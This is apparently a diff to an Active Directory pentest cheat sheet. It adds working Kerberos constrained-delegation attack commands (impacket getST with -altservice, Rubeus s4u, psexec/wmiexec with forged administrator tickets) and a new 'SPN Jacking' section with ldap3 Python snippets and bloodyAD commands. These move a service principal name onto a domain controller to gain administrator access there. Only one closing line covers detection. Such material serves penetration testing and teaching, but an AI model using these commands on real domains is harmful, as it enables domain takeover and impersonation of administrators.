@@ -84,13 +84,80 @@ Get-DomainComputer -TrustedToAuth | Select dnshostname, msDS-AllowedToDelegateTo
 
 # If you have control of delegated service account:
 # impacket — S4U2Self + S4U2Proxy
-impacket-getST -spn <allowed_spn> domain.local/svc_account:pass -impersonate administrator
+impacket-getST -spn <allowed_spn> domain.local/svc_account:pass -impersonate administrator -dc-ip <dc_ip>
 export KRB5CCNAME=administrator.ccache
 impacket-psexec -k -no-pass domain.local/administrator@<target>
 
+# With -altservice: rewrite service class in the ticket (ticket is encrypted with target key)
+# Useful when AllowedToDelegateTo = HTTP/host but you need CIFS/host for file access
+impacket-getST -spn HTTP/<target_fqdn> -impersonate administrator -altservice CIFS/<target_fqdn> \
+  domain.local/svc_account:pass -dc-ip <dc_ip>
+# The TGS is encrypted with the target host's key — changing service class doesn't break it
+# because service class is in the unencrypted portion of the ticket
+
 # Rubeus S4U (Windows)
 .\Rubeus.exe s4u /user:svc_account /password:pass /impersonateuser:administrator /msdsspn:<allowed_spn> /ptt
+# With altservice:
+.\Rubeus.exe s4u /user:svc_account /password:pass /impersonateuser:administrator \
+  /msdsspn:HTTP/<target> /altservice:cifs/<target> /ptt
 ```
+
+**Clock skew**: Kerberos operations fail with `KRB_AP_ERR_SKEW` if client clock differs >5 min from DC. Fix with `faketime '+Nh'` (Linux) or sync time before running tools.
+
+---
+
+## SPN Jacking (SPN Hijacking via WriteSPN)
+
+When an account has Constrained Delegation to a specific SPN (e.g., `HTTP/WEB01.domain.local`) and you control a principal with **WriteSPN** (Validated Write to servicePrincipalName) on both the current SPN holder and a higher-value target:
+
+**Concept**: Move the target SPN from machine A to machine B. The KDC resolves SPNs at request time — if `HTTP/WEB01.domain.local` is now on DC01$, S4U2Proxy encrypts the TGS with DC01$'s key. Use `-altservice` to rewrite to `CIFS/DC01.domain.local`.
+
+```bash
+# Prerequisites:
+# - Controlled account (svc_kcd) with msDS-AllowedToDelegateTo = ['HTTP/TARGET.domain.local']
+# - WriteSPN permission on both SOURCE$ (current SPN holder) and DEST$ (desired target)
+
+# Step 1: Remove SPN from current holder
+python3 -c "
+import ldap3
+from ldap3 import Server, Connection, MODIFY_ADD, MODIFY_DELETE, NTLM
+conn = Connection(Server('<dc_ip>'), user='domain\\\\attacker', password='pass', authentication=NTLM)
+conn.bind()
+conn.modify('CN=SOURCE,CN=Computers,DC=domain,DC=local',
+    {'servicePrincipalName': [(MODIFY_DELETE, ['HTTP/TARGET.domain.local'])]})
+print(conn.result['description'])
+"
+
+# Step 2: Add SPN to desired target (e.g., DC)
+python3 -c "
+import ldap3
+from ldap3 import Server, Connection, MODIFY_ADD, MODIFY_DELETE, NTLM
+conn = Connection(Server('<dc_ip>'), user='domain\\\\attacker', password='pass', authentication=NTLM)
+conn.bind()
+conn.modify('CN=DC01,OU=Domain Controllers,DC=domain,DC=local',
+    {'servicePrincipalName': [(MODIFY_ADD, ['HTTP/TARGET.domain.local'])]})
+print(conn.result['description'])
+"
+
+# Step 3: S4U2Proxy — KDC now resolves SPN to DC01$ → ticket encrypted with DC01$ key
+impacket-getST -spn HTTP/TARGET.domain.local -impersonate administrator \
+  -altservice CIFS/DC01.domain.local domain.local/svc_kcd:pass -dc-ip <dc_ip>
+export KRB5CCNAME=administrator@CIFS_DC01.domain.local@DOMAIN.LOCAL.ccache
+impacket-wmiexec -k -no-pass administrator@DC01.domain.local
+
+# Alternative: bloodyAD for SPN manipulation
+bloodyAD -u attacker -p pass -d domain.local --host <dc_ip> set object 'SOURCE$' servicePrincipalName -v 'HTTP/TARGET.domain.local' --remove
+bloodyAD -u attacker -p pass -d domain.local --host <dc_ip> set object 'DC01$' servicePrincipalName -v 'HTTP/TARGET.domain.local' --append
+```
+
+**Key details**:
+- AD enforces SPN uniqueness — must REMOVE from source before ADD to destination (otherwise `constraintViolation`)
+- WriteSPN = Validated Write to `servicePrincipalName` attribute (commonly granted to groups managing computer objects)
+- The KCD account's `msDS-AllowedToDelegateTo` doesn't change — only the SPN-to-account mapping moves
+- `-altservice` works because the ticket's service class (`sname` field) is in the unencrypted ticket portion; the encrypted part uses the target account's key regardless of service class
+- Protocol Transition (`TrustedToAuthForDelegation`) on the KCD account enables S4U2Self without a forwardable TGT from the impersonated user
+
+**Detection**: Event ID 4742 (computer account modified) with `servicePrincipalName` attribute change on a Domain Controller object.
 
 ---
 
